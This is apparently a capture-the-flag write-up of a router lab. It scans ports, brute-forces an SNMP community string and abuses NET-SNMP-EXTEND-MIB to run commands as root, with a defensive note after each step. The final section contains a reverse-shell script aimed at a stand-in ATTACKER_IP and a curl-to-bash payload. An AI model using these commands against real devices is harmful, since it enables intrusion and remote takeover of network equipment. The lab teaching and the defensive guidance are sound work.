**Operation Take Over**

Take control of the network one router at a time.
(Note: This walkthrough demonstrates offensive techniques in a CTF environment. In real-world scenarios, defenders should monitor, harden, and patch systems to prevent these exact attacks.)

**Network Port Scanning**
=========================
```
nmap -sS -Pn -p- TARGET_IP
```
Result:
```
Host is up (0.00019s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
179/tcp  open  bgp
2623/tcp open  lmdp
```
Defensive note: 
- Continuous monitoring of unusual open ports (like 2623/tcp) and restricting access to management services can prevent attackers from discovering weak points.

**Service Fingerprint**
=======================
```
nmap -sS -sC -sV -p 22,179,2623 22,179,2623 TARGET_IP
```
Result shows OpenSSH and FRRouting.
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ed:1b:23:ac:31:84:b2:9b:7b:4a:f5:0e:b6:62:34:c1 (RSA)
|   256 41:1d:53:58:a5:b1:18:83:80:e6:21:13:c7:08:90:cc (ECDSA)
|_  256 ba:cc:5d:26:cf:ef:c2:bb:50:32:55:9f:4d:5a:9c:0f (ED25519)
179/tcp  open  tcpwrapped
2623/tcp open  lmdp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, NULL, RPCCheck: 
|     Hello, this is FRRouting (version 10.0).
|     Copyright 1996-2005 Kunihiro Ishiguro, et al.
|     User Access Verification
|     Password:
|   DNSVersionBindReqTCP: 
|     Hello, this is FRRouting (version 10.0).
|     Copyright 1996-2005 Kunihiro Ishiguro, et al.
|     User Access Verification
|     Password: 
|     Password:
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     Hello, this is FRRouting (version 10.0).
|     Copyright 1996-2005 Kunihiro Ishiguro, et al.
|     User Access Verification
|     Password: 
|     Password: 
|_    Password:
1 service unrecognized despite returning data. If you know the service/version, 
```
Defensive note:
- Keep routing daemons updated and disable unnecessary services. 
- Attackers often exploit outdated FRRouting or misconfigured BGP.

**Banner Grabbing**
===================
```
nc TARGET_IP 2623
```
Output reveals FRRouting banner.
```
Hello, this is FRRouting (version 10.0).
Copyright 1996-2005 Kunihiro Ishiguro, et al.

User Access Verification

      "  Password: as

Password: as

Password: as

% Bad passwords, too many failures!
```
Defensive note: 
- Banner suppression or obfuscation reduces information leakage that attackers rely on.

First time realized that -sS -sT scan not always useful, sometime need out of box thinking, -sU scan

**UDP Port Scan**
=================
```
nmap -sU -Pn -F TARGET_IP
```
Result:
```
Host is up (0.00033s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp
```
Defensive note: 
- SNMP should never be exposed to untrusted networks.
- Use SNMPv3 with strong authentication and encryption.

[Router SNMP Attack](https://www.darkreading.com/endpoint-security/weak-security-fuel-russian-cyberattacks)

**Service Fingerprint**
===================================
```
nmap -sU -p 161 --script snmp-info TARGET_IP
```
result
```
PORT    STATE         SERVICE VERSION
161/udp open          snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 871c550736ea516600000000
|   snmpEngineBoots: 13
|_  snmpEngineTime: 47m51s
```

**SNMP Community String Discovery**
===================================
We used nmap to brute-force SNMP community strings against the target with a common wordlist from SecLists. This checks whether the target's SNMPv1/v2c service accepts weak or default community strings like pr1v4t3 or pr1v4t3. 
```
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings.txt TARGET_IP
```
result
```
Nmap scan report for ip-10-128-151-69.eu-west-3.compute.internal (TARGET_IP)
Host is up (0.00030s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute: 
|_  pr1v4t3 - Valid credentials

Nmap done: 1 IP address (1 host up) scanned in 5.73 seconds
```
Defensive note:
- Default or weak SNMP community strings are a critical misconfiguration. 
- Rotate them, enforce ACLs, and prefer SNMPv3.

**Modify system name using community string**
============================================
[Reference](https://hackviser.com/tactics/pentesting/services/snmp#write-access-exploitation)
```
snmpset -v2c -c pr1v4t3 -v2c TARGET_IP .1.3.6.1.2.1.1.5.0 s "root"
```
Verified
```
snmpget -v2c -c pr1v4t3 -v2c TARGET_IP .1.3.6.1.2.1.1.5.0
```
<img width="550" height="85" alt="takeover_1_modify_system_name" src="https://github.com/user-attachments/assets/f5e73802-1f0c-4289-8054-c962003a1e02" />

Defensive note:
- Write access via SNMP is dangerous.
- Disable write access unless absolutely required.

**Read Flag**
=============
Using NET-SNMP-EXTEND-MIB to execute commands remotely.

[Reference](https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e)
```
apt-get install snmp-mibs-downloader
download-mibs
```
Change SNMP output to be human readable
```
echo "" > /etc/snmp/snmp.conf
```
Command
```
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 \
    TARGET_IP \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /bin/bash \
    'nsExtendArgs."command"'    = '-c "ls /root"'
```
result
```
root@ip-10-128-111-8:~# snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3     TARGET_IP     'nsExtendStatus."command"'  = createAndGo     'nsExtendCommand."command"' = /bin/bash     'nsExtendArgs."command"'    = '-c "ls /root"'
NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/bash
NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "ls /root"
```
command
```
snmpwalk -v2c -c pr1v4t3 TARGET_IP  nsExtendObjects
```
result
```
root@ip-10-128-111-8:~# snmpwalk -v2c -c pr1v4t3 TARGET_IP  nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/bash
NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "ls /root"
NET-SNMP-EXTEND-MIB::nsExtendInput."command" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."command" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."command" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."command" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."command" = INTEGER: volatile(2)
NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."command" = STRING: flag.txt
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."command" = STRING: flag.txt
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."command" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."command" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."command".1 = STRING: flag.txt
```
command
```
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 \
    TARGET_IP \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /bin/bash \
    'nsExtendArgs."command"'    = '-c "cat /root/flag.txt"'
```
result
```
root@ip-10-128-111-8:~# snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3     TARGET_IP     'nsExtendStatus."command"'  = createAndGo     'nsExtendCommand."command"' = /bin/bash     'nsExtendArgs."command"'    = '-c "cat /root/flag.txt"'NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/bash
NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "cat /root/flag.txt"
```
command
```
snmpwalk -v2c -c pr1v4t3 TARGET_IP  nsExtendObjects
```
result
```
root@ip-10-128-111-8:~# snmpwalk -v2c -c pr1v4t3 TARGET_IP  nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 2
NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/bash
NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "cat /root/flag.txt"
NET-SNMP-EXTEND-MIB::nsExtendInput."command" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."command" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."command" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."command" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."command" = INTEGER: volatile(2)
NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."command" = STRING: THM{redacted}
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."command" = STRING: THM{redacted}
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."command" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."command" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."command".1 = STRING: THM{redacted}
```
Defensive note: 
- Extended MIB functionality should be disabled unless strictly necessary.
- It can be abused for arbitrary command execution.

**Shell Access**
================
Payload delivered via SNMP to fetch and execute a reverse shell.

shell.sh file
```
#!/bin/bash
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4545 0>&1
```
File Server
```
python3 -m http.server
```
Shell listner
```
nc -lvnp 4545
```
Payload
```
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 \
    TARGET_IP \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /bin/bash \
    'nsExtendArgs."command"'    = '-c "curl ATTACKER_IP:8000/shell.sh|bash"'
```
Execute
```
snmpwalk -v2c -c pr1v4t3 TARGET_IP  nsExtendObjects
```
<img width="939" height="384" alt="takeover_1_root_shell" src="https://github.com/user-attachments/assets/6706f9f8-19e5-47c4-ae00-d83ec623c1ae" />

Defensive note: 
- Network intrusion detection systems (NIDS) can catch unusual SNMP traffic patterns.
- Restrict SNMP to management VLANs only.


**Key Defensive Takeaways**

Patch & Update: Keep FRRouting, OpenSSH, and SNMP daemons updated.

Restrict Access: Limit SNMP to trusted management networks.

Use SNMPv3: Strong authentication and encryption prevent brute-force attacks.

Monitor & Alert: Watch for unusual SNMP activity, especially write operations.

Audit Regularly: Validate community strings, OID permissions, and trap destinations.
